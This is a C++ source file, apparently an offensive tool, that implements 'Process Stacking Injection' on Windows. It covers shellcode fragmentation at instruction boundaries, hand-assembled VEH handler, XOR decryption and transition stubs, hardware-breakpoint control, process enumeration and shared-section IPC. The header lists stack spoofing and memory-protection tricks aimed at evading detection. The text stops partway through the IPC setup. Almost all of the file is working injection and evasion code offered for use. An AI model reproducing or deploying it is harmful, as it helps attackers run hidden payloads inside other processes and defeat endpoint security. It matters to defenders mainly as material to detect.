/*
 * Process Stacking Injection - True Implementation
 * =================================================
 *
 * Implements all required components for genuine Process Stacking:
 *
 *  1. x86-64 Length Disassembler Engine (LDE) - instruction-boundary fragmentation
 *  2. Transition stubs with hardware breakpoint targets
 *  3. Hardware breakpoints via DR0-DR3 + DR7 (SetThreadContext)
 *  4. Vectored Exception Handler (VEH) for #DB capture
 *  5. Cross-process IPC via NtCreateSection shared memory
 *  6. Register serialization (CONTEXT snapshot in VEH handler)
 *  7. Stack spoofing per fragment (SilentMoonwalk-style fake frames)
 *  8. Deferred RW -> RX page protection flip
 *  9. In-memory XOR decryption stub (PIC assembly)
 * 10. Per-fragment execution - each host process runs its own chunk
 *
 * Target: x86-64 Windows 10/11
 * Compiler: MSVC (cl /EHsc /O2 ProcessStackingInjection.cpp)
 *
 * For educational and authorized security research only.
 */

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdint>

#pragma comment(lib, "ntdll.lib")

// ============================================================================
// Section 1: NT API Declarations
// ============================================================================

typedef NTSTATUS(NTAPI* pfnNtCreateSection)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle
);

typedef NTSTATUS(NTAPI* pfnNtMapViewOfSection)(
    HANDLE          SectionHandle,
    HANDLE          ProcessHandle,
    PVOID*          BaseAddress,
    ULONG_PTR       ZeroBits,
    SIZE_T          CommitSize,
    PLARGE_INTEGER  SectionOffset,
    PSIZE_T         ViewSize,
    DWORD           InheritDisposition,
    ULONG           AllocationType,
    ULONG           Win32Protect
);

typedef NTSTATUS(NTAPI* pfnNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID  BaseAddress
);

typedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)(
    PHANDLE     ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID       ObjectAttributes,
    HANDLE      ProcessHandle,
    PVOID       StartRoutine,
    PVOID       Argument,
    ULONG       CreateFlags,
    SIZE_T      ZeroBits,
    SIZE_T      StackSize,
    SIZE_T      MaxStackSize,
    PVOID       AttributeList
);

// ============================================================================
// Section 2: Configuration & Structures
// ============================================================================

constexpr int    MAX_FRAGMENTS     = 8;
constexpr BYTE   XOR_KEY           = 0x5A;
constexpr DWORD  SIGNAL_IDLE       = 0;
constexpr DWORD  SIGNAL_READY      = 1;
constexpr DWORD  SIGNAL_EXECUTING  = 2;
constexpr DWORD  SIGNAL_DONE       = 3;
constexpr SIZE_T SHARED_SIZE       = 0x10000;
constexpr DWORD  CONTEXT_X64_SIZE  = 1232;  // sizeof(CONTEXT) on x64

// CONTEXT field offsets (x64 Windows)
constexpr DWORD CTX_OFF_DR0  = 0x048;
constexpr DWORD CTX_OFF_DR7  = 0x070;
constexpr DWORD CTX_OFF_RAX  = 0x078;
constexpr DWORD CTX_OFF_RCX  = 0x080;
constexpr DWORD CTX_OFF_RSP  = 0x098;
constexpr DWORD CTX_OFF_RIP  = 0x0F8;

#pragma pack(push, 1)
struct SharedContext {
    volatile LONG currentFragment;  // 0x00
    LONG          pad1;             // 0x04
    volatile LONG signal;          // 0x08
    LONG          pad2;            // 0x0C
    BYTE          savedContext[CONTEXT_X64_SIZE]; // 0x10: serialized CONTEXT
    BYTE          userData[4096];   // extra IPC data area
};
#pragma pack(pop)

struct FragmentInfo {
    size_t  offset;         // offset within original shellcode
    size_t  size;           // fragment size in bytes
    DWORD   hostPid;        // target process PID
    HANDLE  hProcess;       // process handle
    HANDLE  hThread;        // thread handle (for execution)
    LPVOID  payloadBase;    // base address of injected payload in target
    LPVOID  vehHandlerAddr; // VEH handler code address in target
    LPVOID  fragmentAddr;   // fragment code address within payload
    LPVOID  transitionAddr; // transition stub address (HW BP target)
    LPVOID  stackBase;      // spoofed stack allocation
    LPVOID  sharedMapAddr;  // shared section mapped address in target
};

// ============================================================================
// Section 3: x86-64 Length Disassembler Engine (LDE)
// ============================================================================

namespace LDE {

#define C_NONE    0x00
#define C_MODRM   0x01  // has ModR/M byte
#define C_IMM8    0x02  // 8-bit immediate
#define C_IMM_W   0x04  // 32-bit immediate (16-bit with 66h prefix)
#define C_REL8    0x08  // 8-bit relative offset
#define C_REL32   0x10  // 32-bit relative offset
#define C_IMM16   0x20  // 16-bit immediate (fixed, not prefix-dependent)

static const uint8_t OpcodeTable1[256] = {
    // 0x00-0x0F: ADD, OR
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_IMM8,  C_IMM_W, C_NONE,  C_NONE,
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_IMM8,  C_IMM_W, C_NONE,  C_NONE,
    // 0x10-0x1F: ADC, SBB
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_IMM8,  C_IMM_W, C_NONE,  C_NONE,
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_IMM8,  C_IMM_W, C_NONE,  C_NONE,
    // 0x20-0x2F: AND, SUB
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_IMM8,  C_IMM_W, C_NONE,  C_NONE,
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_IMM8,  C_IMM_W, C_NONE,  C_NONE,
    // 0x30-0x3F: XOR, CMP
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_IMM8,  C_IMM_W, C_NONE,  C_NONE,
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_IMM8,  C_IMM_W, C_NONE,  C_NONE,
    // 0x40-0x4F: REX prefixes (handled separately, table entry = NONE)
    C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE,
    C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE,
    // 0x50-0x5F: PUSH/POP reg
    C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE,
    C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE,
    // 0x60-0x6F
    C_NONE,  C_NONE,  C_NONE,  C_MODRM,           // 60 PUSHA, 61 POPA, 62 BOUND, 63 MOVSXD
    C_NONE,  C_NONE,  C_NONE,  C_NONE,             // 64 FS:, 65 GS:, 66 OpSz, 67 AdSz
    C_IMM_W, C_MODRM|C_IMM_W, C_IMM8, C_MODRM|C_IMM8, // 68 PUSH, 69 IMUL, 6A PUSH, 6B IMUL
    C_NONE,  C_NONE,  C_NONE,  C_NONE,             // 6C-6F INS/OUTS
    // 0x70-0x7F: Jcc rel8
    C_REL8, C_REL8, C_REL8, C_REL8, C_REL8, C_REL8, C_REL8, C_REL8,
    C_REL8, C_REL8, C_REL8, C_REL8, C_REL8, C_REL8, C_REL8, C_REL8,
    // 0x80-0x8F
    C_MODRM|C_IMM8, C_MODRM|C_IMM_W, C_MODRM|C_IMM8, C_MODRM|C_IMM8, // 80-83 Group1
    C_MODRM, C_MODRM, C_MODRM, C_MODRM,           // 84 TEST, 85 TEST, 86 XCHG, 87 XCHG
    C_MODRM, C_MODRM, C_MODRM, C_MODRM,           // 88-8B MOV
    C_MODRM, C_MODRM, C_MODRM, C_MODRM,           // 8C MOV Sreg, 8D LEA, 8E MOV Sreg, 8F POP
    // 0x90-0x9F
    C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, // 90-97 NOP/XCHG
    C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, C_NONE, // 98-9F
    // 0xA0-0xAF
    C_NONE, C_NONE, C_NONE, C_NONE,  // A0-A3: MOV moffs (special, handled in code)
    C_NONE, C_NONE, C_NONE, C_NONE,  // A4-A7: MOVS/CMPS
    C_IMM8, C_IMM_W,                 // A8-A9: TEST AL/rAX
    C_NONE, C_NONE, C_NONE, C_NONE,  // AA-AD: STOS/LODS
    C_NONE, C_NONE,                   // AE-AF: SCAS
    // 0xB0-0xBF
    C_IMM8, C_IMM8, C_IMM8, C_IMM8, C_IMM8, C_IMM8, C_IMM8, C_IMM8,   // B0-B7 MOV r8, imm8
    C_IMM_W, C_IMM_W, C_IMM_W, C_IMM_W, C_IMM_W, C_IMM_W, C_IMM_W, C_IMM_W, // B8-BF MOV r, imm (special: imm64 with REX.W)
    // 0xC0-0xCF
    C_MODRM|C_IMM8, C_MODRM|C_IMM8, // C0-C1: Shift imm8
    C_IMM16,  C_NONE,                // C2 RET imm16, C3 RET
    C_MODRM,  C_MODRM,               // C4 LES/VEX, C5 LDS/VEX
    C_MODRM|C_IMM8, C_MODRM|C_IMM_W, // C6 MOV r/m8,imm8, C7 MOV r/m,imm32
    C_NONE,   C_NONE,                // C8 ENTER (special), C9 LEAVE
    C_IMM16,  C_NONE,                // CA RETF imm16, CB RETF
    C_NONE,   C_IMM8,                // CC INT3, CD INT imm8
    C_NONE,   C_NONE,                // CE INTO, CF IRET
    // 0xD0-0xDF
    C_MODRM, C_MODRM, C_MODRM, C_MODRM,  // D0-D3: Shift by 1/CL
    C_IMM8,  C_IMM8,  C_NONE,  C_NONE,    // D4 AAM, D5 AAD, D6 SALC, D7 XLAT
    C_MODRM, C_MODRM, C_MODRM, C_MODRM,  // D8-DB: x87 FPU
    C_MODRM, C_MODRM, C_MODRM, C_MODRM,  // DC-DF: x87 FPU
    // 0xE0-0xEF
    C_REL8,  C_REL8,  C_REL8,  C_REL8,    // E0 LOOPNE, E1 LOOPE, E2 LOOP, E3 JECXZ
    C_IMM8,  C_IMM8,  C_IMM8,  C_IMM8,    // E4-E7: IN/OUT imm8
    C_REL32, C_REL32, C_NONE,  C_REL8,    // E8 CALL, E9 JMP, EA JMPF, EB JMP short
    C_NONE,  C_NONE,  C_NONE,  C_NONE,    // EC-EF: IN/OUT DX
    // 0xF0-0xFF
    C_NONE,  C_NONE,  C_NONE,  C_NONE,    // F0 LOCK, F1 INT1, F2 REPNE, F3 REPE
    C_NONE,  C_NONE,  C_MODRM, C_MODRM,   // F4 HLT, F5 CMC, F6 Grp3, F7 Grp3
    C_NONE,  C_NONE,  C_NONE,  C_NONE,    // F8-FB: CLC/STC/CLI/STI
    C_NONE,  C_NONE,  C_MODRM, C_MODRM,   // FC CLD, FD STD, FE INC/DEC, FF Grp5
};

static const uint8_t OpcodeTable2[256] = {
    // 0F 00-0F
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_NONE, C_NONE,  C_NONE,  C_NONE,
    C_NONE,  C_NONE,  C_NONE,  C_NONE,  C_NONE, C_MODRM, C_NONE,  C_NONE,
    // 0F 10-1F: SSE MOV, NOP
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    // 0F 20-2F: MOV CR/DR, SSE
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_NONE,  C_MODRM, C_NONE,
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    // 0F 30-3F: WRMSR, RDTSC, etc + 3-byte escapes
    C_NONE,  C_NONE,  C_NONE,  C_NONE,  C_NONE,  C_NONE,  C_NONE,  C_NONE,
    C_MODRM, C_NONE,  C_MODRM, C_NONE,  C_NONE,  C_NONE,  C_NONE,  C_NONE,
    // 0F 40-4F: CMOVcc
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    // 0F 50-5F: SSE
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    // 0F 60-6F: MMX/SSE
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    // 0F 70-7F: SSE shuffle/shift + imm8
    C_MODRM|C_IMM8, C_MODRM|C_IMM8, C_MODRM|C_IMM8, C_MODRM|C_IMM8,
    C_MODRM, C_MODRM, C_MODRM, C_NONE,
    C_MODRM, C_MODRM, C_NONE,  C_NONE,
    C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    // 0F 80-8F: Jcc rel32
    C_REL32, C_REL32, C_REL32, C_REL32, C_REL32, C_REL32, C_REL32, C_REL32,
    C_REL32, C_REL32, C_REL32, C_REL32, C_REL32, C_REL32, C_REL32, C_REL32,
    // 0F 90-9F: SETcc
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    // 0F A0-AF
    C_NONE,  C_NONE,  C_NONE,  C_MODRM,                   // A0 PUSH FS, A1 POP FS, A2 CPUID, A3 BT
    C_MODRM|C_IMM8, C_MODRM,  C_NONE,  C_NONE,            // A4 SHLD, A5 SHLD, A6, A7
    C_NONE,  C_NONE,  C_NONE,  C_MODRM,                   // A8 PUSH GS, A9 POP GS, AA, AB BTS
    C_MODRM|C_IMM8, C_MODRM,  C_MODRM, C_MODRM,           // AC SHRD, AD SHRD, AE grp, AF IMUL
    // 0F B0-BF
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    C_MODRM, C_MODRM, C_MODRM|C_IMM8, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    // 0F C0-CF
    C_MODRM, C_MODRM, C_MODRM|C_IMM8, C_MODRM,
    C_MODRM|C_IMM8, C_MODRM|C_IMM8, C_MODRM|C_IMM8, C_MODRM,
    C_NONE,  C_NONE,  C_NONE,  C_NONE,  C_NONE,  C_NONE,  C_NONE,  C_NONE, // C8-CF BSWAP
    // 0F D0-DF: SSE
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    // 0F E0-EF: SSE
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    // 0F F0-FF: SSE
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM,
    C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_MODRM, C_NONE,
};

size_t InstructionLength(const uint8_t* code) {
    const uint8_t* p = code;
    bool has66 = false, has67 = false;
    bool hasRex = false;
    uint8_t rex = 0;

    // 1. Legacy prefixes
    for (;;) {
        uint8_t b = *p;
        switch (b) {
        case 0x66: has66 = true; p++; continue;
        case 0x67: has67 = true; p++; continue;
        case 0xF0: case 0xF2: case 0xF3:
        case 0x26: case 0x2E: case 0x36: case 0x3E:
        case 0x64: case 0x65:
            p++; continue;
        }
        break;
    }

    // 2. REX prefix (0x40-0x4F)
    if ((*p & 0xF0) == 0x40) {
        hasRex = true;
        rex = *p++;
    }

    // 3. Opcode
    uint8_t op1 = *p++;
    uint8_t flags;

    if (op1 == 0x0F) {
        uint8_t op2 = *p++;
        if (op2 == 0x38) {
            p++;  // 3-byte opcode 0F 38 xx
            flags = C_MODRM;
        } else if (op2 == 0x3A) {
            p++;  // 3-byte opcode 0F 3A xx
            flags = C_MODRM | C_IMM8;
        } else {
            flags = OpcodeTable2[op2];
        }
    } else {
        flags = OpcodeTable1[op1];

        // Special: A0-A3 MOV moffs (8-byte address in 64-bit, 4-byte with 67h)
        if (op1 >= 0xA0 && op1 <= 0xA3) {
            return (size_t)(p - code) + (has67 ? 4 : 8);
        }
        // Special: B8-BF with REX.W = MOV reg, imm64
        if (op1 >= 0xB8 && op1 <= 0xBF && hasRex && (rex & 0x08)) {
            return (size_t)(p - code) + 8;
        }
        // Special: C8 ENTER imm16, imm8 = 3 bytes immediate
        if (op1 == 0xC8) {
            return (size_t)(p - code) + 3;
        }
    }

    // 4. ModR/M + SIB + Displacement
    uint8_t regField = 0;
    if (flags & C_MODRM) {
        uint8_t modrm = *p++;
        uint8_t mod = modrm >> 6;
        uint8_t rm  = modrm & 7;
        regField = (modrm >> 3) & 7;

        if (mod != 3 && rm == 4) {
            uint8_t sib = *p++;
            uint8_t base = sib & 7;
            if (mod == 0 && base == 5)
                p += 4;  // [disp32 + scaled_index]
        }

        if (mod == 0 && rm == 5)
            p += 4;  // RIP-relative disp32
        else if (mod == 1)
            p += 1;  // disp8
        else if (mod == 2)
            p += 4;  // disp32

        // Special: F6 /0 TEST r/m8, imm8 (extra immediate)
        if (op1 == 0xF6 && regField == 0)
            p += 1;
        // Special: F7 /0 TEST r/m, imm32 (extra immediate, or imm16 with 66h)
        if (op1 == 0xF7 && regField == 0)
            p += (has66 ? 2 : 4);
    }

    // 5. Immediate / Relative data
    if (flags & C_IMM8)  p += 1;
    if (flags & C_IMM16) p += 2;
    if (flags & C_IMM_W) p += (has66 ? 2 : 4);
    if (flags & C_REL8)  p += 1;
    if (flags & C_REL32) p += 4;

    return (size_t)(p - code);
}

// Validate: decode all instructions and verify total covers the buffer
bool ValidateDisassembly(const uint8_t* code, size_t size) {
    size_t offset = 0;
    while (offset < size) {
        size_t len = InstructionLength(code + offset);
        if (len == 0 || len > 15)
            return false;
        offset += len;
    }
    return (offset == size);
}

} // namespace LDE

// ============================================================================
// Section 4: Shellcode Fragmentation Engine
// ============================================================================

struct FragmentBounds {
    size_t offset;
    size_t size;
};

// Split shellcode at instruction boundaries into approximately numParts fragments
std::vector<FragmentBounds> FragmentAtInstructionBoundaries(
    const uint8_t* shellcode, size_t shellcodeSize, int numParts)
{
    // First pass: find all instruction boundaries
    std::vector<size_t> boundaries;
    boundaries.push_back(0);

    size_t offset = 0;
    while (offset < shellcodeSize) {
        size_t len = LDE::InstructionLength(shellcode + offset);
        if (len == 0 || len > 15) {
            std::cerr << "[-] LDE failure at offset 0x" << std::hex << offset << std::dec << "\n";
            break;
        }
        offset += len;
        boundaries.push_back(offset);
    }

    if (offset != shellcodeSize) {
        std::cerr << "[-] Shellcode does not end on instruction boundary\n";
        return {};
    }

    // Target fragment size
    size_t targetSize = shellcodeSize / numParts;

    std::vector<FragmentBounds> fragments;
    size_t fragStart = 0;

    for (int i = 0; i < numParts; i++) {
        if (i == numParts - 1) {
            // Last fragment takes everything remaining
            fragments.push_back({fragStart, shellcodeSize - fragStart});
            break;
        }

        size_t targetEnd = fragStart + targetSize;
        size_t bestBoundary = fragStart;

        // Find the instruction boundary closest to targetEnd
        for (size_t b : boundaries) {
            if (b <= fragStart) continue;
            if (b > shellcodeSize) break;
            bestBoundary = b;
            if (b >= targetEnd) break;
        }

        if (bestBoundary == fragStart) {
            // Couldn't find a split point; take at least one instruction
            for (size_t b : boundaries) {
                if (b > fragStart) {
                    bestBoundary = b;
                    break;
                }
            }
        }

        fragments.push_back({fragStart, bestBoundary - fragStart});
        fragStart = bestBoundary;
    }

    return fragments;
}

// ============================================================================
// Section 5: PIC Shellcode Stubs (pre-assembled x86-64)
// ============================================================================

namespace Stubs {

/*
 * VEH Handler - catches #DB (hardware breakpoint), serializes CONTEXT to shared section
 *
 * Calling convention: x64 fastcall, RCX = PEXCEPTION_POINTERS
 * Returns: EXCEPTION_CONTINUE_EXECUTION (-1) or EXCEPTION_CONTINUE_SEARCH (0)
 *
 * Layout:
 *   mov rax, [rcx]                ; ExceptionRecord
 *   cmp dword [rax], 0x80000004   ; EXCEPTION_SINGLE_STEP?
 *   jne .not_ours
 *   mov r8, SHARED_ADDR           ; (PATCHED)
 *   mov rdx, [rcx+8]             ; ContextRecord
 *   push rdi / push rsi / push rcx
 *   lea rdi, [r8+0x10]           ; dest = shared CONTEXT area
 *   mov rsi, rdx                 ; source = CONTEXT
 *   mov ecx, 154                 ; 1232/8 qwords
 *   rep movsq                    ; copy CONTEXT
 *   pop rcx / pop rsi / pop rdi
 *   mov qword [rdx+0x48], 0     ; clear DR0
 *   mov qword [rdx+0x70], 0     ; clear DR7
 *   mov dword [r8+8], 3         ; signal = DONE
 *   mov eax, -1                 ; CONTINUE_EXECUTION
 *   ret
 * .not_ours:
 *   xor eax, eax                ; CONTINUE_SEARCH
 *   ret
 */
static const size_t VEH_HANDLER_SHARED_PATCH_OFFSET = 13; // offset of imm64 in mov r8
static const size_t VEH_HANDLER_SIZE = 79;

std::vector<uint8_t> GenerateVEHHandler(uint64_t sharedSectionAddr) {
    uint8_t handler[] = {
        0x48, 0x8B, 0x01,                                       // mov rax, [rcx]
        0x81, 0x38, 0x04, 0x00, 0x00, 0x80,                     // cmp dword [rax], 0x80000004
        0x75, 0x41,                                              // jne .not_ours (+65)
        0x49, 0xB8,                                              // mov r8, imm64 (PATCHED)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // shared section address
        0x48, 0x8B, 0x51, 0x08,                                  // mov rdx, [rcx+8]
        0x57,                                                    // push rdi
        0x56,                                                    // push rsi
        0x51,                                                    // push rcx
        0x49, 0x8D, 0x78, 0x10,                                  // lea rdi, [r8+0x10]
        0x48, 0x89, 0xD6,                                        // mov rsi, rdx
        0xB9, 0x9A, 0x00, 0x00, 0x00,                            // mov ecx, 154
        0xF3, 0x48, 0xA5,                                        // rep movsq
        0x59,                                                    // pop rcx
        0x5E,                                                    // pop rsi
        0x5F,                                                    // pop rdi
        0x48, 0xC7, 0x42, 0x48, 0x00, 0x00, 0x00, 0x00,          // mov qword [rdx+0x48], 0 (DR0)
        0x48, 0xC7, 0x42, 0x70, 0x00, 0x00, 0x00, 0x00,          // mov qword [rdx+0x70], 0 (DR7)
        0x41, 0xC7, 0x40, 0x08, 0x03, 0x00, 0x00, 0x00,          // mov dword [r8+8], 3
        0xB8, 0xFF, 0xFF, 0xFF, 0xFF,                            // mov eax, -1
        0xC3,                                                    // ret
        0x31, 0xC0,                                              // xor eax, eax
        0xC3,                                                    // ret
    };

    std::vector<uint8_t> result(handler, handler + sizeof(handler));

    // Patch shared section address
    memcpy(&result[VEH_HANDLER_SHARED_PATCH_OFFSET], &sharedSectionAddr, 8);

    return result;
}

/*
 * VEH Setup Stub - registers the VEH handler in the target process
 *
 *   sub rsp, 0x28                  ; shadow space + alignment
 *   mov ecx, 1                    ; First = TRUE
 *   mov rdx, HANDLER_ADDR         ; (PATCHED)
 *   mov rax, AVEH_ADDR            ; AddVectoredExceptionHandler (PATCHED)
 *   call rax
 *   add rsp, 0x28
 *   ret
 */
static const size_t VEH_SETUP_HANDLER_PATCH = 9;   // offset of handler addr imm64
static const size_t VEH_SETUP_AVEH_PATCH    = 19;  // offset of AVEH addr imm64
static const size_t VEH_SETUP_SIZE          = 36;

std::vector<uint8_t> GenerateVEHSetup(uint64_t handlerAddr, uint64_t avehAddr) {
    uint8_t setup[] = {
        0x48, 0x83, 0xEC, 0x28,                                  // sub rsp, 0x28
        0xB9, 0x01, 0x00, 0x00, 0x00,                            // mov ecx, 1
        0x48, 0xBA,                                              // mov rdx, imm64
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // handler address
        0x48, 0xB8,                                              // mov rax, imm64
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // AVEH address
        0xFF, 0xD0,                                              // call rax
        0x48, 0x83, 0xC4, 0x28,                                  // add rsp, 0x28
        0xC3,                                                    // ret
    };

    std::vector<uint8_t> result(setup, setup + sizeof(setup));
    memcpy(&result[VEH_SETUP_HANDLER_PATCH], &handlerAddr, 8);
    memcpy(&result[VEH_SETUP_AVEH_PATCH], &avehAddr, 8);
    return result;
}

/*
 * Decryption Stub - XOR-decrypts the encrypted fragment in place
 *
 * RIP-relative LEA points to the encrypted data immediately following this stub.
 * Fragment starts at stub_base + 29 bytes.
 *
 *   push rcx
 *   push rdx
 *   push rax
 *   lea rcx, [rip + 0x13]         ; -> encrypted fragment (29-10=19 ahead of RIP)
 *   mov edx, FRAG_SIZE            ; (PATCHED at offset 11)
 *   mov al, XOR_KEY               ; (PATCHED at offset 16)
 *   .loop:
 *   xor byte [rcx], al
 *   inc rcx
 *   dec edx
 *   jnz .loop
 *   pop rax
 *   pop rdx
 *   pop rcx
 *   ; fall through to decrypted fragment
 */
static const size_t DECRYPT_SIZE_PATCH = 11;  // 4-byte fragment size
static const size_t DECRYPT_KEY_PATCH  = 16;  // 1-byte XOR key
static const size_t DECRYPT_STUB_SIZE  = 29;

std::vector<uint8_t> GenerateDecryptStub(uint32_t fragmentSize, uint8_t xorKey) {
    uint8_t stub[] = {
        0x51,                                                    // push rcx
        0x52,                                                    // push rdx
        0x50,                                                    // push rax
        0x48, 0x8D, 0x0D, 0x13, 0x00, 0x00, 0x00,               // lea rcx, [rip+0x13]
        0xBA, 0x00, 0x00, 0x00, 0x00,                            // mov edx, fragment_size
        0xB0, 0x00,                                              // mov al, xor_key
        // .loop:
        0x30, 0x01,                                              // xor [rcx], al
        0x48, 0xFF, 0xC1,                                        // inc rcx
        0xFF, 0xCA,                                              // dec edx
        0x75, 0xF7,                                              // jnz .loop (-9)
        0x58,                                                    // pop rax
        0x5A,                                                    // pop rdx
        0x59,                                                    // pop rcx
    };

    std::vector<uint8_t> result(stub, stub + sizeof(stub));
    memcpy(&result[DECRYPT_SIZE_PATCH], &fragmentSize, 4);
    result[DECRYPT_KEY_PATCH] = xorKey;
    return result;
}

/*
 * Transition Stub - hardware breakpoint target at the end of each fragment
 *
 * DR0 is set to the address of this stub's first byte (NOP).
 * When execution reaches it, CPU raises #DB BEFORE the NOP executes.
 * VEH handler catches it, serializes state, signals done.
 * After VEH clears DR0/DR7 and returns CONTINUE_EXECUTION,
 * the NOP finally executes, then the thread enters a spin loop.
 *
 *   nop                            ; DR0 target (breakpoint fires here)
 *   pause                         ; rep nop
 *   jmp $-2                       ; infinite loop (back to pause)
 */
static const size_t TRANSITION_STUB_SIZE = 5;

std::vector<uint8_t> GenerateTransitionStub() {
    uint8_t stub[] = {
        0x90,                   // nop (hardware breakpoint target)
        0xF3, 0x90,             // pause
        0xEB, 0xFC,             // jmp $-2 (back to pause)
    };
    return std::vector<uint8_t>(stub, stub + sizeof(stub));
}

} // namespace Stubs

// ============================================================================
// Section 6: Process Enumeration
// ============================================================================

std::vector<DWORD> FindProcesses(const wchar_t* processName, int count) {
    std::vector<DWORD> pids;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return pids;

    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                pids.push_back(pe.th32ProcessID);
                if ((int)pids.size() >= count)
                    break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pids;
}

DWORD FindFirstThread(DWORD pid) {
    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    DWORD tid = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tid = te.th32ThreadID;
                break;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return tid;
}

// ============================================================================
// Section 7: Shared Section IPC (NtCreateSection / NtMapViewOfSection)
// ============================================================================

class SharedSectionIPC {
public:
    HANDLE       hSection = NULL;
    LPVOID       localView = nullptr;
    SIZE_T       viewSize = SHARED_SIZE;

    pfnNtCreateSection     NtCreateSection = nullptr;
    pfnNtMapViewOfSection  NtMapViewOfSection = nullptr;
    pfnNtUnmapViewOfSection NtUnmapViewOfSection = nullptr;

    bool Initialize() {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        NtCreateSection     = (pfnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
        NtMapViewOfSection  = (pfnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
        NtUnmapViewOfSection = (pfnNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

        if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection) {
            std::cerr << "[-] Failed to resolve NtSection APIs\n";
            return false;
        }

        // Create an anonymous shared section (RW)
        LARGE_INTEGER maxSize;
        maxSize.QuadPart = SHARED_SIZE;

        NTSTATUS status = NtCreateSection(
            &hSection, SECTION_ALL_ACCESS, NULL,
            &maxSize, PAGE_READWRITE, SEC_COMMIT, NULL);

        if (status != 0) {
            std::cerr << "[-] NtCreateSection failed: 0x" << std::hex << status << "\n";
            return false;
        }

        // Map locally (RW)
        localView = nullptr;
        viewSize = SHARED_SIZE;
        status = NtMapViewOfSection(
            hSection, GetCurrentProcess(), &localView,
            0, 0, NULL, &viewSize, 2 /*ViewShare*/, 0, PAGE_READWRITE);

        if (status != 0) {
            std::cerr << "[-] NtMapViewOfSection (local) failed: 0x" << std::hex << status << "\n";
            return false;
        }

        // Zero-initialize
        memset(localView, 0, SHARED_SIZE);

